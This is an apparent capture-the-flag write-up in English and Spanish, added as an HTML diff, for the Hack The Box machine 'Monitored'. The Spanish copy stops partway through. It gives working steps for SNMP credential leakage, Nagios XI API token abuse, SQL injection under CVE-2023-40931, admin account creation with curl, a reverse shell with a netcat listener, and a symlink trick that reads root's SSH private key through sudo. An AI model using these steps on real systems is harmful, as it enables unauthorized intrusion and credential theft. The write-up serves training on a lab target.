@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>monitored | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">monitored</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running Nagios XI version 5.11.0 with multiple exposed services. Initial reconnaissance revealed an SNMP service on UDP port 161 that was leaking credentials in plaintext within command parameters.</p>
+                    
+                    <p>These credentials belonged to the <code>svc</code> user, which couldn't be used directly through the web login interface. However, by authenticating through the Nagios XI API, I obtained a valid authentication token that granted access to the monitoring platform.</p>
+                    
+                    <p>Once inside, I discovered the platform was vulnerable to CVE-2023-40931, an SQL injection vulnerability in a specific endpoint. Using sqlmap, I extracted the administrator's API key from the database. With this API key, I created a new administrator account and configured a custom command that executed a reverse shell payload, gaining initial access as the <code>nagios</code> user.</p>
+                    
+                    <p>For privilege escalation, I analyzed the sudo permissions available to the nagios user and identified the <code>getprofile.sh</code> script as a potential vector. This script collected various log files, including <code>/usr/local/nagiosxi/tmp/phpmailer.log</code>, and compressed them into a ZIP file. By creating a symbolic link from <code>phpmailer.log</code> to root's SSH private key (<code>/root/.ssh/id_rsa</code>) and executing the script with sudo, I was able to extract root's SSH key from the generated archive, allowing direct SSH access as root.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> SNMP credential leakage via UDP port 161, Nagios XI API authentication bypass, SQL injection vulnerability CVE-2023-40931, Nagios XI authenticated RCE through custom command execution, privilege escalation via symbolic link abuse in getprofile.sh script.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>I begin with an nmap scan to identify open ports and running services on the target machine:</p>
+                <p><img src="./media/image6.png"
+                        alt="Nmap scan results showing open ports including SSH, HTTP, HTTPS, LDAP, and Nagios-related services" />
+                </p>
+
+                <p>The scan reveals several interesting services. Ports 80, 443, and 5667 are all related to Nagios, which I can access through the web interface. The system presents a login page for which I don't have credentials yet. Additionally, port 389 is running LDAP, which might be useful for enumeration later.</p>
+
+                <p>I add <code>monitored.htb</code> and <code>nagios.monitored.htb</code> to my <code>/etc/hosts</code> file for proper hostname resolution.</p>
+
+                <h3>UDP Port Scanning</h3>
+                <p>Since many services can run on UDP and are often overlooked, I perform a UDP port scan and discover two additional open ports:</p>
+                <p><img src="./media/image2.png" alt="UDP scan results showing ports 123 (NTP) and 161 (SNMP) open" /></p>
+
+                <p>UDP ports 123 (NTP) and 161 (SNMP) are now visible. The SNMP service is particularly interesting as it's often misconfigured and can leak sensitive information.</p>
+
+                <h2>SNMP Enumeration - Credential Leakage</h2>
+                <p>SNMP (Simple Network Management Protocol) is designed for network device monitoring and management. When improperly configured, it can expose sensitive information including command-line arguments, which may contain credentials.</p>
+
+                <p>After enumerating the SNMP service on port 161, I discover a command being executed with credentials passed as plaintext arguments:</p>
+                <pre><code class="language-plaintext">Params: -c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB</code></pre>
+
+                <p>This reveals what appears to be credentials for the <code>svc</code> user:</p>
+                <pre><code class="language-plaintext">svc:XjH7VCehowpR1xZB</code></pre>
+
+                <h2>Nagios XI Authentication Bypass</h2>
+                <p>When I attempt to log into the Nagios web interface using these credentials, I receive an interesting error message:</p>
+                <p><img src="./media/image5.png"
+                        alt="Nagios login error message indicating the account has API-only access" /></p>
+
+                <p>The error message is significant - it indicates that this account has "API-only access" and cannot log in through the web interface. However, this tells me that the credentials are valid and that I should try authenticating directly through the Nagios XI API instead.</p>
+
+                <h3>API Authentication</h3>
+                <p>I use curl to authenticate directly against the Nagios XI API endpoint:</p>
+                <pre><code class="language-bash">curl -XPOST -k -L 'http://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1' \
+  -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=120'</code></pre>
+
+                <p>The API responds with a valid authentication token:</p>
+                <pre><code class="language-json">{
+  "username": "svc",
+  "user_id": "2",
+  "auth_token": "0023acf1dae86f2a6be8a71284cf6eb7e22e843e",
+  "valid_min": 120,
+  "valid_until": "Tue, 16 Dec 2025 09:30:22 -0500"
+}</code></pre>
+
+                <p>Using this authentication token, I can access the Nagios XI interface by navigating to:</p>
+                <pre><code class="language-plaintext">https://nagios.monitored.htb/nagiosxi/login.php?token=0023acf1dae86f2a6be8a71284cf6eb7e22e843e</code></pre>
+
+                <p>This successfully grants me access to the Nagios monitoring platform.</p>
+
+                <h2>Version Identification and Vulnerability Research</h2>
+                <p>Once inside the Nagios interface, I check the footer of the page and identify the exact version running:</p>
+                <pre><code class="language-plaintext">Nagios XI 5.11.0</code></pre>
+
+                <p>Researching known vulnerabilities for this specific version, I find CVE-2023-40931, an SQL injection vulnerability. More information can be found at: <a
+                        href="https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2023-40931">https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2023-40931</a>
+                </p>
+
+                <h2>SQL Injection - CVE-2023-40931</h2>
+                <p>The vulnerability exists in a specific endpoint that I can identify while browsing the Nagios interface:</p>
+                <p><img src="./media/image3.png"
+                        alt="Nagios XI endpoint showing the vulnerable URL parameter susceptible to SQL injection" /></p>
+
+                <p>This endpoint is vulnerable to SQL injection, allowing me to extract data from the backend database. I use sqlmap to automate the exploitation process:</p>
+                <p><img src="./media/image1.png" alt="Sqlmap execution showing successful database extraction" /></p>
+
+                <p>Through the SQL injection, I successfully extract two critical pieces of information:</p>
+                <ul>
+                    <li><strong>Administrator password hash:</strong> <code>$2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C</code></li>
+                    <li><strong>Administrator API key:</strong> <code>IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL</code></li>
+                </ul>
+
+                <p>The password hash appears to be bcrypt format. I attempt to crack it using hashcat with the rockyou wordlist, but it doesn't yield results. However, the API key alone should be sufficient to perform administrative actions.</p>
+
+                <h2>Creating an Admin Account</h2>
+                <p>With the administrator's API key, I can create a new administrative user account using the Nagios XI API:</p>
+                <pre><code class="language-bash">curl -X POST "http://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL" \
+  -d "username=asd" \
+  -d "password=asd" \
+  -d "name=asd" \
+  -d "email=asd@localhost" \
+  -d "auth_level=admin"</code></pre>
+
+                <p>The API confirms successful account creation:</p>
+                <pre><code class="language-json">{"success":"User account asd was added successfully!","user_id":6}</code></pre>
+
+                <p>Now I have full administrative access to the Nagios XI platform with a user account I control.</p>
+
+                <h2>Initial Access - Remote Code Execution</h2>
+                <p>Nagios XI allows administrators to configure custom commands that can be executed on the system. This functionality is intended for monitoring purposes, but it can be abused to achieve remote code execution.</p>
+
+                <p>I navigate to the Core Config Manager at:</p>
+                <pre><code class="language-plaintext">https://nagios.monitored.htb/nagiosxi/includes/components/ccm/xi-index.php</code></pre>
+
+                <p>Here I can configure a custom command that will execute a reverse shell payload:</p>
+                <p><img src="./media/image4.png"
+                        alt="Nagios XI Core Config Manager showing the configuration of a custom command with reverse shell payload" />
+                </p>
+
+                <p>The custom command contains a bash reverse shell that will connect back to my attacking machine. I set up a netcat listener to catch the connection:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>After saving the command configuration, I navigate to the service command insertion page at:</p>
+                <pre><code class="language-plaintext">https://nagios.monitored.htb/nagiosxi/includes/components/ccm/index.php?cmd=insert&type=service</code></pre>
+
+                <p>I execute the configured command to test it, and successfully receive the reverse shell connection:</p>
+                <pre><code class="language-bash">listening on [any] 443 ...
+connect to [10.10.16.2] from (UNKNOWN) [10.10.11.248] 45368
+bash: cannot set terminal process group: Inappropriate ioctl for device
+bash: no job control in this shell
+nagios@monitored:/usr/local/nagiosxi/html$</code></pre>
+
+                <p>I now have shell access as the <code>nagios</code> user and can retrieve the user flag.</p>
+
+                <h2>Post-Exploitation Enumeration</h2>
+                <p>After gaining initial access, I begin enumerating the system to find a path to privilege escalation. In the <code>/home</code> directory, I notice there's also an <code>svc</code> user, but the password I obtained earlier (<code>XjH7VCehowpR1xZB</code>) doesn't work for lateral movement to that account.</p>
+
+                <h3>Local Port Enumeration</h3>
+                <p>Checking for services listening on localhost, I discover several interesting ports:</p>
+                <pre><code class="language-plaintext">tcp LISTEN 0 250 127.0.0.1:3306 0.0.0.0:*
+tcp LISTEN 0 244 127.0.0.1:5432 0.0.0.0:*
+tcp LISTEN 0  20 127.0.0.1:25   0.0.0.0:*
+tcp LISTEN 0 128 127.0.0.1:7878 0.0.0.0:*</code></pre>
+
+                <p>These ports correspond to MySQL (3306), PostgreSQL (5432), SMTP (25), and an unknown service (7878).</p>
+
+                <h3>Password Hash Discovery</h3>
+                <p>While exploring the Nagios configuration files, I find additional password hashes in <code>/usr/local/nagiosxi/etc/htpasswd.users</code>:</p>
+                <pre><code class="language-plaintext">nagiosadmin:{SHA}WafcJ8xiUKCvKhkZpBW1+oJm59Q=
+nagiosxi:{SHA}tu+2LQemR+XONdxwgApW0NB7qlM=</code></pre>
+
+                <p>These are SHA-1 hashes encoded in base64. I need to convert them to hexadecimal format for hashcat to process them properly:</p>
+                <pre><code class="language-bash">echo "WafcJ8xiUKCvKhkZpBW1+oJm59Q=" | base64 -d | xxd -p</code></pre>
+                <pre><code class="language-plaintext">59a7dc27cc6250a0af2a1919a415b5fa8266e7d4</code></pre>
+
+                <pre><code class="language-bash">echo "tu+2LQemR+XONdxwgApW0NB7qlM=" | base64 -d | xxd -p</code></pre>
+                <pre><code class="language-plaintext">b6efb62d07a647e5ce35dc70800a56d0d07baa53</code></pre>
+
+                <p>I attempt to crack these hashes using hashcat with the rockyou wordlist, but they don't crack successfully.</p>
+
+                <h2>Privilege Escalation - Sudo Permissions Analysis</h2>
+                <p>I check what sudo permissions the <code>nagios</code> user has:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <p>The output reveals extensive sudo permissions:</p>
+                <pre><code class="language-plaintext">Matching Defaults entries for nagios on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User nagios may run the following commands on localhost:
+    (root) NOPASSWD: /etc/init.d/nagios start
+    (root) NOPASSWD: /etc/init.d/nagios stop
+    (root) NOPASSWD: /etc/init.d/nagios restart
+    (root) NOPASSWD: /etc/init.d/nagios reload
+    (root) NOPASSWD: /etc/init.d/nagios status
+    (root) NOPASSWD: /etc/init.d/nagios checkconfig
+    (root) NOPASSWD: /etc/init.d/npcd start
+    (root) NOPASSWD: /etc/init.d/npcd stop
+    (root) NOPASSWD: /etc/init.d/npcd restart
+    (root) NOPASSWD: /etc/init.d/npcd reload
+    (root) NOPASSWD: /etc/init.d/npcd status
+    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
+    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
+    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/migrate/migrate.php *
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *</code></pre>
+
+                <p>There are many scripts that can be executed with root privileges. After reviewing the options, the most promising vector appears to be the <code>getprofile.sh</code> script.</p>
+
+                <h2>Exploiting getprofile.sh - Symbolic Link Abuse</h2>
+                <p>The <code>/usr/local/nagiosxi/scripts/components/getprofile.sh</code> script is designed to collect system information for troubleshooting purposes. It reads various log files using <code>tail</code> and creates a ZIP archive containing their contents at <code>/usr/local/nagiosxi/var/components/profile.zip</code>.</p>
+
+                <h3>Understanding the Vulnerability</h3>
+                <p>One of the files the script reads is <code>/usr/local/nagiosxi/tmp/phpmailer.log</code>. The key insight is that I have write permissions in the <code>/usr/local/nagiosxi/tmp/</code> directory due to the group ownership assigned to the nagios user.</p>
+
+                <p>This means I can delete the existing <code>phpmailer.log</code> file and create a symbolic link pointing to any file on the system. When the script runs with root privileges, it will read the target file and include its contents in the ZIP archive.</p>
+
+                <h3>Extracting Root's SSH Key</h3>
+                <p>I create a symbolic link from <code>phpmailer.log</code> to root's SSH private key:</p>
+                <pre><code class="language-bash">cd /usr/local/nagiosxi/tmp
+ln -s /root/.ssh/id_rsa phpmailer.log</code></pre>
+
+                <p>Now I execute the <code>getprofile.sh</code> script with sudo (the script requires a profile ID parameter, which can be any value):</p>
+                <pre><code class="language-bash">sudo /usr/local/nagiosxi/scripts/components/getprofile.sh 1</code></pre>
+
+                <p>The script executes successfully and creates a ZIP archive. I extract it to access its contents:</p>
+                <pre><code class="language-bash">unzip ../var/components/profile.zip</code></pre>
+
+                <p>Inside the extracted archive, the <code>phpmailer.log</code> file now contains root's SSH private key:</p>
+                <pre><code class="language-bash">cat profile-1765984977/phpmailer.log</code></pre>
+                <pre><code class="language-plaintext">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAnZYnlG22OdnxaaK98DJMc9isuSgg9wtjC0r1iTzlSRVhNALtSd2C
+[...]</code></pre>
+
+                <p>I copy this private key to my local machine and save it as <code>root_id_rsa</code>. I set the correct permissions on the key file:</p>
+                <pre><code class="language-bash">chmod 600 root_id_rsa</code></pre>
+
+                <h2>Root Access via SSH</h2>
+                <p>With root's SSH private key in hand, I can now connect directly to the system as root:</p>
+                <pre><code class="language-bash">ssh -i root_id_rsa root@monitored.htb</code></pre>
+
+                <p>The connection is successful, granting me root access:</p>
+                <pre><code class="language-plaintext">Linux monitored 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+root@monitored:~# whoami
+root</code></pre>
+
+                <p>I can now retrieve the root flag and complete the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba Nagios XI versión 5.11.0 con múltiples servicios expuestos. El reconocimiento inicial reveló un servicio SNMP en el puerto UDP 161 que filtraba credenciales en texto plano dentro de parámetros de comandos.</p>
+                    
+                    <p>Estas credenciales pertenecían al usuario <code>svc</code>, que no podía utilizarse directamente a través de la interfaz web de login. Sin embargo, autenticándome a través de la API de Nagios XI, obtuve un token de autenticación válido que me concedió acceso a la plataforma de monitorización.</p>
+                    
+                    <p>Una vez dentro, descubrí que la plataforma era vulnerable a CVE-2023-40931, una vulnerabilidad de inyección SQL en un endpoint específico. Usando sqlmap, extraje la clave API del administrador de la base de datos. Con esta clave API, creé una nueva cuenta de administrador y configuré un comando personalizado que ejecutó un payload de reverse shell, obteniendo acceso inicial como el usuario <code>nagios</code>.</p>
+                    
+                    <p>Para la escalada de privilegios, analicé los permisos sudo disponibles para el usuario nagios e identifiqué el script <code>getprofile.sh</code> como un vector potencial. Este script recopilaba varios archivos de logs, incluyendo <code>/usr/local/nagiosxi/tmp/phpmailer.log</code>, y los comprimía en un archivo ZIP. Creando un enlace simbólico desde <code>phpmailer.log</code> a la clave SSH privada de root (<code>/root/.ssh/id_rsa</code>) y ejecutando el script con sudo, pude extraer la clave SSH de root del archivo generado, permitiendo acceso SSH directo como root.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Filtrado de credenciales SNMP vía puerto UDP 161, bypass de autenticación API de Nagios XI, vulnerabilidad de inyección SQL CVE-2023-40931, RCE autenticado en Nagios XI mediante ejecución de comandos personalizados, escalada de privilegios mediante abuso de enlaces simbólicos en el script getprofile.sh.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en ejecución en la máquina objetivo:</p>
+                <p><img src="./media/image6.png"
+                        alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH, HTTP, HTTPS, LDAP y servicios relacionados con Nagios" />
+                </p>
+
+                <p>El escaneo revela varios servicios interesantes. Los puertos 80, 443 y 5667 están todos relacionados con Nagios, al que puedo acceder mediante la interfaz web. El sistema presenta una página de login para la que aún no tengo credenciales. Además, el puerto 389 ejecuta LDAP, que podría ser útil para la enumeración más adelante.</p>
+
+                <p>Añado <code>monitored.htb</code> y <code>nagios.monitored.htb</code> a mi archivo <code>/etc/hosts</code> para la correcta resolución de nombres de host.</p>
+
+                <h3>Escaneo de Puertos UDP</h3>
+                <p>Dado que muchos servicios pueden ejecutarse en UDP y a menudo se pasan por alto, realizo un escaneo de puertos UDP y descubro dos puertos abiertos adicionales:</p>
+                <p><img src="./media/image2.png" alt="Resultados del escaneo UDP mostrando los puertos 123 (NTP) y 161 (SNMP) abiertos" /></p>
+
+                <p>Los puertos UDP 123 (NTP) y 161 (SNMP) ahora son visibles. El servicio SNMP es particularmente interesante ya que a menudo está mal configurado y puede filtrar información sensible.</p>
+
+                <h2>Enumeración SNMP - Filtrado de Credenciales</h2>
+                <p>SNMP (Simple Network Management Protocol) está diseñado para la monitorización y gestión de dispositivos de red. Cuando está configurado incorrectamente, puede exponer información sensible incluyendo argumentos de línea de comandos, que pueden contener credenciales.</p>
+
+                <p>Tras enumerar el servicio SNMP en el puerto 161, descubro un comando siendo ejecutado con credenciales pasadas como argumentos en texto plano:</p>
+                <pre><code class="language-plaintext">Params: -c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB</code></pre>
+
+                <p>Esto revela lo que parecen ser credenciales para el usuario <code>svc</code>:</p>
+                <pre><code class="language-plaintext">svc:XjH7VCehowpR1xZB</code></pre>
+
+                <h2>Bypass de Autenticación en Nagios XI</h2>
+                <p>Cuando intento iniciar sesión en la interfaz web de Nagios usando estas credenciales, recibo un mensaje de error interesante:</p>
+                <p><img src="./media/image5.png"
+                        alt="Mensaje de error de login de Nagios indicando que la cuenta tiene acceso solo a la API" /></p>
+
+                <p>El mensaje de error es significativo - indica que esta cuenta tiene "acceso solo a la API" y no puede iniciar sesión a través de la interfaz web. Sin embargo, esto me dice que las credenciales son válidas y que debería intentar autenticarme directamente a través de la API de Nagios XI en su lugar.</p>
+
+                <h3>Autenticación API</h3>
+                <p>Uso curl para autenticarme directamente contra el endpoint de la API de Nagios XI:</p>
+                <pre><code class="language-bash">curl -XPOST -k -L 'http://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1' \
+  -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=120'</code></pre>
+
+                <p>La API responde con un token de autenticación válido:</p>
+                <pre><code class="language-json">{
+  "username": "svc",
+  "user_id": "2",
+  "auth_token": "0023acf1dae86f2a6be8a71284cf6eb7e22e843e",
+  "valid_min": 120,
+  "valid_until": "Tue, 16 Dec 2025 09:30:22 -0500"
+}</code></pre>
+
+                <p>Usando este token de autenticación, puedo acceder a la interfaz de Nagios XI navegando a:</p>
+                <pre><code class="language-plaintext">https://nagios.monitored.htb/nagiosxi/login.php?token=0023acf1dae86f2a6be8a71284cf6eb7e22e843e</code></pre>
+
+                <p>Esto me concede exitosamente acceso a la plataforma de monitorización Nagios.</p>
+
+                <h2>Identificación de Versión e Investigación de Vulnerabilidades</h2>
+                <p>Una vez dentro de la interfaz de Nagios, compruebo el footer de la página e identifico la versión exacta en ejecución:</p>
+                <pre><code class="language-plaintext">Nagios XI 5.11.0</code></pre>
+
+                <p>Investigando vulnerabilidades conocidas para esta versión específica, encuentro CVE-2023-40931, una vulnerabilidad de inyección SQL. Más información puede encontrarse en: <a
+                        href="https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2023-40931">https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2023-40931</a>
+                </p>
+
+                <h2>Inyección SQL - CVE-2023-40931</h2>
+                <p>La vulnerabilidad existe en un endpoint específico que puedo identificar mientras navego por la interfaz de Nagios:</p>
+                <p><img src="./media/image3.png"
+                        alt="Endpoint de Nagios XI mostrando el parámetro URL vulnerable a inyección SQL" /></p>
+
+                <p>Este endpoint es vulnerable a inyección SQL, permitiéndome extraer datos de la base de datos backend. Uso sqlmap para automatizar el proceso de explotación:</p>
+                <p><img src="./media/image1.png" alt="Ejecución de sqlmap mostrando extracción exitosa de la base de datos" /></p>
+
+                <p>A través de la inyección SQL, extraigo exitosamente dos piezas críticas de información:</p>
+                <ul>
+                    <li><strong>Hash de contraseña del administrador:</strong> <code>$2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C</code></li>
+                    <li><strong>Clave API del administrador:</strong> <code>IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL</code></li>
+                </ul>
+
+                <p>El hash de contraseña parece estar en formato bcrypt. Intento crackearlo usando hashcat con el wordlist rockyou, pero no da resultados. Sin embargo, la clave API por sí sola debería ser suficiente para realizar acciones administrativas.</p>
+
+                <h2>Creando una Cuenta de Administrador</h2>
+                <p>Con la clave API del administrador, puedo crear una nueva cuenta de usuario administrativa usando la API de Nagios XI:</p>
+                <pre><code class="language-bash">curl -X POST "http://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL" \
+  -d "username=asd" \
+  -d "password=asd" \
+  -d "name=asd" \
+  -d "email=asd@localhost" \
+  -d "auth_level=admin"</code></pre>
+
+                <p>La API confirma la creación exitosa de la cuenta:</p>
+                <pre><code class="language-json">{"success":"User account asd was added successfully!","user_id":6}</code></pre>
+
+                <p>Ahora tengo acceso administrativo completo a la plataforma Nagios XI con una cuenta de usuario que controlo.</p>
+
+                <h2>Acceso Inicial - Ejecución Remota de Código</h2>
+                <p>Nagios XI permite a los administradores configurar comandos personalizados que pueden ejecutarse en el sistema. Esta funcionalidad está destinada a propósitos de monitorización, pero puede abusarse para conseguir ejecución remota de código.</p>
+
+                <p>Navego al Core Config Manager en:</p>
+                <pre><code class="language-plaintext">https://nagios.monitored.htb/nagiosxi/includes/components/ccm/xi-index.php</code></pre>
+
+                <p>Aquí puedo configurar un comando personalizado que ejecutará un payload de reverse shell:</p>
+                <p><img src="./media/image4.png"
+                        alt="Core Config Manager de Nagios XI mostrando la configuración de un comando personalizado con payload de reverse shell" />
+                </p>
+
+                <p>El comando personalizado contiene una reverse shell de bash que se conectará de vuelta a mi máquina atacante. Configuro un listener de netcat para capturar la conexión:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>Después de guardar la configuración del comando, navego a la página de inserción de comandos de servicio en:</p>
+                <pre><code class="language-plaintext">https://nagios.monitored.htb/nagiosxi/includes/components/ccm/index.php?cmd=insert&type=service</code></pre>
+
+                <p>Ejecuto el comando configurado para probarlo, y recibo exitosamente la conexión de reverse shell:</p>
+                <pre><code class="language-bash">listening on [any] 443 ...
+connect to [10.10.16.2] from (UNKNOWN) [10.10.11.248] 45368
+bash: cannot set terminal process group: Inappropriate ioctl for device
+bash: no job control in this shell
+nagios@monitored:/usr/local/nagiosxi/html$</code></pre>
+
+                <p>Ahora tengo acceso shell como el usuario <code>nagios</code> y puedo recuperar la flag de usuario.</p>
+
+                <h2>Enumeración Post-Explotación</h2>
+                <p>Tras obtener el acceso inicial, comienzo a enumerar el sistema para encontrar un camino hacia la escalada de privilegios. En el directorio <code>/home</code>, noto que también hay un usuario <code>svc</code>, pero la contraseña que obtuve anteriormente (<code>XjH7VCehowpR1xZB</code>) no funciona para movimiento lateral a esa cuenta.</p>
+
+                <h3>Enumeración de Puertos Locales</h3>
+                <p>Comprobando servicios escuchando en localhost, descubro varios puertos interesantes:</p>
+                <pre><code class="language-plaintext">tcp LISTEN 0 250 127.0.0.1:3306 0.0.0.0:*
+tcp LISTEN 0 244 127.0.0.1:5432 0.0.0.0:*
+tcp LISTEN 0  20 127.0.0.1:25   0.0.0.0:*
+tcp LISTEN 0 128 127.0.0.1:7878 0.0.0.0:*</code></pre>
+
+                <p>Estos puertos corresponden a MySQL (3306), PostgreSQL (5432), SMTP (25), y un servicio desconocido (7878).</p>
+
+                <h3>Descubrimiento de Hashes de Contraseñas</h3>
+                <p>Mientras exploro los archivos de configuración de Nagios, encuentro hashes de contraseñas adicionales en <code>/usr/local/nagiosxi/etc/htpasswd.users</code>:</p>
+                <pre><code class="language-plaintext">nagiosadmin:{SHA}WafcJ8xiUKCvKhkZpBW1+oJm59Q=
+nagiosxi:{SHA}tu+2LQemR+XONdxwgApW0NB7qlM=</code></pre>
+
+                <p>Estos son hashes SHA-1 codificados en base64. Necesito convertirlos a formato hexadecimal para que hashcat los pueda procesar correctamente:</p>
+                <pre><code class="language-bash">echo "WafcJ8xiUKCvKhkZpBW1+oJm59Q=" | base64 -d | xxd -p</code></pre>
+                <pre><code class="language-plaintext">59a7dc27cc6250a0af2a1919a415b5fa8266e7d4</code></pre>
+
+                <pre><code class="language-bash">echo "tu+2LQemR+XONdxwgApW0NB7qlM=" | base64 -d | xxd -p</code></pre>
+                <pre><code class="language-plaintext">b6efb62d07a647e5ce35dc70800a56d0d07baa53</code></pre>
+
+                <p>Intento crackear estos hashes usando hashcat con el wordlist rockyou, pero no se crackean exitosamente.</p>
+
+                <h2>Escalada de Privilegios - Análisis de Permisos Sudo</h2>
+                <p>Compruebo qué permisos sudo tiene el usuario <code>nagios</code>:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <p>La salida revela permisos sudo extensivos:</p>
+                <pre><code class="language-plaintext">Matching Defaults entries for nagios on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User nagios may run the following commands on localhost:
+    (root) NOPASSWD: /etc/init.d/nagios start
+    (root) NOPASSWD: /etc/init.d/nagios stop
+    (root) NOPASSWD: /etc/init.d/nagios restart
+    (root) NOPASSWD: /etc/init.d/nagios reload
+    (root) NOPASSWD: /etc/init.d/nagios status
+    (root) NOPASSWD: /etc/init.d/nagios checkconfig
+    (root) NOPASSWD: /etc/init.d/npcd start
+    (root) NOPASSWD: /etc/init.d/npcd stop
+    (root) NOPASSWD: /etc/init.d/npcd restart
+    (root) NOPASSWD: /etc/init.d/npcd reload
+    (root) NOPASSWD: /etc/init.d/npcd status
+    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
+    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
+    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/migrate/migrate.php *
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *</code></pre>
+
+                <p>Hay muchos scripts que pueden ejecutarse con privilegios de root. Tras revisar las opciones, el vector más prometedor parece ser el script <code>getprofile.sh</code>.</p>
+
+                <h2>Explotando getprofile.sh - Abuso de Enlaces Simbólicos</h2>
